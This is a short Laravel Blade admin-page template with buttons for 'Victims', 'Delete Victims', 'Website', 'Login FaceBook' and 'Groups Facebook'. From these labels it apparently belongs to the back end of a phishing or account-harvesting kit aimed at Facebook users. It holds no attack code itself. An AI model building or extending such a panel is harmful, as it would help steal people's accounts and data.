@extends('empaty')

@section('css')
    <style>
        body {
            background: black
        }
    </style>
@stop

@section('title')
    admin
@stop

@section('content')
    <div class="container ">
        <div class="row">

            <div class="col-5 m-5">
                <a class="btn btn-danger w-100" href="{{ route('vic.index') }}">Victims</a>
            </div>
            <div class="col-5 m-5">
                <a class="btn btn-danger w-100" href="{{ route('Del_victims') }}">Delete Victims</a>
            </div>
            <div class="col-12 m-5">
                <a class="btn btn-success w-100" href="{{ route('websites.index') }}">Website</a>
            </div>
            <div class="col-12 m-5">
                <a class="btn btn-primary w-100" href="{{ url('login_FaceBook') }}">Login FaceBook</a>
            </div>
            <div class="col-12 m-5">
                <a class="btn btn-info w-100" href="{{ route('groups.index') }}">Groups Facebook</a>
            </div>
            <div class="col-12 m-5">
                <a class="btn btn-warning w-100" href="{{ route('welcom.index') }}">Welcom</a>
            </div>
            <div class="col-12 m-5">
                <a class="btn btn-secondary w-100" href="{{ url('/profile') }}">Profile</a>
            </div>
        </div>



    </div>
@stop

@section('js')
@stop
